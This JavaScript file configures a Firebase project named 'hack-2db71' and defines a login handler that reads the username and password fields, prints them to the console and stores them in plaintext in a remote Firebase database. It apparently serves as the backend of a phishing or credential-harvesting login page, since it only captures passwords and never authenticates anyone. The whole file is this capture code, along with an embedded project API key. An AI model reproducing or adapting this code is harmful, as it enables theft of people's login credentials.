
// Your web app's Firebase configuration
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
var firebaseConfig = {
  apiKey: "AIzaSyA65yQ2iHBDo0Lk4xAZUE00B-T7RB9MH2M",
  authDomain: "hack-2db71.firebaseapp.com",
  databaseURL: "https://hack-2db71-default-rtdb.firebaseio.com",
  projectId: "hack-2db71",
  storageBucket: "hack-2db71.appspot.com",
  messagingSenderId: "129351751967",
  appId: "1:129351751967:web:172dcac07d136407ba382a",
  measurementId: "G-MTN8ZWD4T7"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
var database = firebase.database();

// la apasarea
function loginPressed() {
  let username = document.getElementById("username-field").value;
  let password = document.getElementById("password-field").value;

  writeUserData(username, password);

  console.log(username);
  console.log(password);

}


function writeUserData(username, password) {
  firebase.database().ref('users/' + username).set({
    username: username,
    password: password,
  });
}
